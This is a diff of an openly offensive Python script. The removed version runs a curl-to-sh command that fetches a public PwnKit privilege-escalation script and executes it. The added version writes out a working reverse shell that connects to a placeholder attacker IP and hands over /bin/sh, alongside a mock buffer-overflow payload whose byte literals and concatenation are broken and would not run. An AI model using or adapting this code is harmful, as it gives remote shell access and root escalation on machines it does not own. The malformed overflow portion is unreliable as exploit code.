@@ -1,6 +1,7 @@
+import socket
 import subprocess
 import os
-import time
+import struct
 
 def display_banner():
     banner = """
@@ -10,42 +11,51 @@ def display_banner():
     """
     print(banner)
 
-def inject_command(command):
-    try:
-        # Execute the command without waiting for it to finish
-        process = subprocess.Popen(command, shell=True)
-        return process
-    except Exception as e:
-        return None
+def inject_reverse_shell(ip, port):
+    # Create a reverse shell connection
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    
+    # Redirect the socket to subprocess
+    os.dup2(s.fileno(), 0)  # Redirect standard input
+    os.dup2(s.fileno(), 1)  # Redirect standard output
+    os.dup2(s.fileno(), 2)  # Redirect standard error
+
+    # Start a shell
+    subprocess.call(["/bin/sh", "-i"])
 
 def simulate_large_buffer():
+    # Buffer overflow parameters
     buffer_size = 1000
     buffer = bytearray(buffer_size)
     nop_sled_size = 200
-    shellcode = b"/bin/sh"
-    return_address = b"\xde\xad\xbe\xef"  # Example return address, not used in this context
+    shellcode = b""
+    
+    # Reverse shell payload
+    ip = b"\xYOUR\xIP\xADDRESS"  # Replace with your IP in bytes
+    port = 1111                   # The port to connect to
+    return_address = struct.pack("<I", 0xdeadbeef)  # Replace with appropriate address if needed
+
+    # NOP sled
     buffer[:nop_sled_size] = b"\x90" * nop_sled_size
+    
+    # Placeholder for shellcode
     buffer[nop_sled_size:nop_sled_size+len(shellcode)] = shellcode
-    buffer[-4:] = return_address
+    
+    # This part injects the reverse shell connection logic
+    buffer[-len(ip)-len(port):] = ip + port + return_address
+
+    print(f"Buffer size: {len(buffer)} bytes")
+    print(f"Buffer (first 50 bytes): {buffer[:50]}")
+    print(f"Buffer (last 50 bytes): {buffer[-50:]}")
+
     return buffer
 
 if __name__ == "__main__":
     display_banner()
+    # Simulate buffer overflow and execute the reverse shell
+    payload = simulate_large_buffer()
     
-    # Prepare the payload
-    buffer = simulate_large_buffer()
-    
-    # Command to inject
-    command = 'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"'
-    
-    # Inject the command
-    process = inject_command(command)
-    
-    if process:
-        print("Success! Command injected and is running in the background.")
-    else:
-        print("Failed to inject command.")
-
-    # Keep the script running without stopping the injected command
-    while True:
-        time.sleep(1)
+    # Here you would typically send `payload` to the vulnerable application
+    # For demonstration purposes, we will just call the reverse shell directly
+    inject_reverse_shell("YOUR_IP_ADDRESS", 1111)  # Change this to your actual IP and PORT
